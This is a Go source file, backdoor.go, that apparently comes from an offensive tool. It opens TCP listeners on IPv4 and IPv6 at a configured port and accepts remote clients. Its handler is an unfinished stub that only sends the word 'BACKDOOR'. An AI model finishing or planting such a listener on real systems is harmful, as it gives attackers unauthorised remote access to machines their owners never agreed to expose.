package main

/*
 * backdoor.go
 * Run a backdoor on the box
 * By J. Stuart McMurray
 * Created 20160808
 * Last Modified 20160808
 */

import (
	"fmt"
	"log"
	"net"
	"sync"
)

/* Backdoor runs a backdoor on the target */
func Backdoor() {
	/* Fire off backdoors on IPv4 and IPv6 */
	wg := &sync.WaitGroup{}
	wg.Add(2)
	go backdoor("tcp4", wg)
	go backdoor("tcp6", wg)
	wg.Wait()
}

/* backdoor listens on the given protocol, with the configured port.  wg's Done
method is decremented before returning. */
func backdoor(proto string, wg *sync.WaitGroup) {
	defer wg.Done()
	/* Listen */
	l, err := net.Listen(proto, fmt.Sprintf(":%v", CONFIG.BDPort))
	if nil != err {
		log.Printf(
			"Unable to start backdoor on %v port %v: %v",
			proto,
			CONFIG.BDPort,
			err,
		)
		return
	}
	log.Printf("Started backdoor on %v", l.Addr())
	/* Handle clients */
	for {
		/* Pop off a client */
		c, err := l.Accept()
		if nil != err {
			log.Printf(
				"Unable to accept backdoor client on %v: %v",
				l.Addr(),
				err,
			)
			return
		}
		log.Printf(
			"Backdoor client connected %v -> %v",
			c.RemoteAddr(),
			c.LocalAddr(),
		)
		/* Handle it */
		go bdhandle(c)
	}
}

/* bdhandle handles a backdoor client */
func bdhandle(c net.Conn) {
	defer c.Close()
	/* TODO: Finish this */
	c.Write([]byte("BACKDOOR\n")) /* DEBUG */
}
